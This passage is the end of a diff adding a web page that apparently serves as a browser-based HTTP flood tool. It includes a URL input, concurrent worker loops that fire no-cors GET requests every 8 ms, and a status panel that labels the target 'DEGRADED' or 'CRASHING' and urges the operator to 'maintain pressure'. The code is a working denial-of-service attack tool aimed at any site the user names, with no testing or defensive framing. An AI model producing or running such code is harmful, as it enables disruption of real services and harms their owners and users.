+  const tp=total>0?Math.round((ttout/total)*100):0;
+  document.getElementById('stout').textContent=tp+'%';
+
+  const dot=document.getElementById('tdot');
+  const val=document.getElementById('tsval');
+  const lbl=document.getElementById('tslabel');
+  const sdot=document.getElementById('sdot');
+  const slbl=document.getElementById('slabel');
+
+  if(!flooding){
+    dot.className='sdot';val.style.color='var(--textlo)';val.textContent='STANDBY';
+    lbl.textContent='Awaiting flood initiation...';
+    sdot.className='sdot';slbl.textContent='STANDBY';return;
+  }
+  const rec=rtimes.slice(-10);
+  const ra=rec.length?rec.reduce((a,b)=>a+b,0)/rec.length:0;
+  if(tp>50||(ra>4000&&total>30)){
+    dot.className='sdot dead';val.style.color='var(--red2)';val.textContent='CRASHING';
+    lbl.textContent='High timeout rate — target under severe stress';
+    sdot.className='sdot dead';slbl.textContent='TARGET CRASHING';
+  } else if(tp>20||ra>2000){
+    dot.className='sdot warn';val.style.color='var(--gold)';val.textContent='DEGRADED';
+    lbl.textContent='Responses slowing — target showing strain';
+    sdot.className='sdot warn';slbl.textContent='DEGRADED';
+  } else if(total>0){
+    dot.className='sdot live';val.style.color='#4a9a6a';val.textContent='RESPONDING';
+    lbl.textContent='Target responding — maintain pressure';
+    sdot.className='sdot live';slbl.textContent='FLOODING';
+  }
+}
+
+async function fireReq(url){
+  const t0=Date.now();
+  const ctrl=new AbortController();
+  const timer=setTimeout(()=>ctrl.abort(),TMO);
+  total++;rpsc++;
+  try{
+    await fetch(url,{method:'GET',mode:'no-cors',cache:'no-store',signal:ctrl.signal});
+    clearTimeout(timer);
+    const ms=Date.now()-t0;
+    tok++;rtimes.push(ms);
+    if(rtimes.length>200)rtimes.shift();
+    if(total%8===0)tlog('ok',`Unit #${total} → ${ms}ms — cumulative: ${fmt(total)}`);
+  }catch(e){
+    clearTimeout(timer);tfail++;
+    if(e.name==='AbortError'){
+      ttout++;
+      if(total%6===0)tlog('fail',`Unit #${total} TIMEOUT — no response in ${TMO}ms`);
+    } else {
+      if(total%12===0)tlog('warn',`Unit #${total} BLOCKED — CORS wall (unit still counted)`);
+    }
+  }
+  updateStats();
+}
+
+async function worker(url){
+  while(flooding){
+    await fireReq(url);
+    await new Promise(r=>setTimeout(r,8));
+  }
+}
+
+function startFlood(){
+  const url=document.getElementById('urlin').value.trim();
+  try{new URL(url)}catch{
+    document.getElementById('urlhint').textContent='Invalid URL. Must include https:// or http://';
+    document.getElementById('urlhint').style.color='var(--red2)';return;
+  }
+  flooding=true;
+  document.getElementById('bflood').classList.remove('vis');
+  document.getElementById('bstop').classList.add('vis');
+  document.getElementById('urlin').disabled=true;
+
+  tlog('info',`FLOOD INITIATED → ${url}`);
+  tlog('info',`Threads: ${CONC} // Mode: CONTINUOUS // Timeout: ${TMO}ms`);
+  tlog('sys','Each thread re-fires instantly on resolve or timeout. No pause.');
+
+  for(let i=0;i<CONC;i++)worker(url);
+
+  rpsiv=setInterval(()=>{
+    const rps=rpsc;rpsc=0;
+    document.getElementById('srps').textContent=rps;
+    pushGraph(rps);
+    if(rps>0&&total%40<rps)tlog('info',`Throughput: ${rps} req/s // Total units: ${fmt(total)}`);
+  },1000);
+}
+
+function stopFlood(){
+  flooding=false;clearInterval(rpsiv);
+  document.getElementById('bstop').classList.remove('vis');
+  document.getElementById('bflood').classList.add('vis');
+  document.getElementById('urlin').disabled=false;
+  document.getElementById('srps').textContent='0';
+  tlog('warn',`FLOOD STOPPED // Units: ${fmt(total)} // OK: ${fmt(tok)} // FAIL: ${fmt(tfail)} // TIMEOUT: ${ttout}`);
+  updateStats();
+}
+
+// ── SETTINGS ────────────────────────────────────────────
+function openSP(){document.getElementById('sp').classList.add('open');document.getElementById('spov').classList.add('open');document.getElementById('spunits').textContent=fmt(total)}
+function closeSP(){document.getElementById('sp').classList.remove('open');document.getElementById('spov').classList.remove('open')}
+function refreshUnits(){
+  flooding=false;clearInterval(rpsiv);
+  total=0;tok=0;tfail=0;ttout=0;rpsc=0;rtimes=[];gdata=new Array(BARS).fill(0);
+  document.getElementById('srps').textContent='0';
+  document.getElementById('bstop').classList.remove('vis');
+  document.getElementById('bflood').classList.add('vis');
+  document.getElementById('urlin').disabled=false;
+  initGraph();updateStats();closeSP();clrTerm();
+  tlog('sys','Units reset. Cache cleared. System re-armed.');
+}
+
+document.addEventListener('keydown',e=>{
+  if(e.key==='Escape')closeSP();
+});
+</script>
+</body>
+</html>
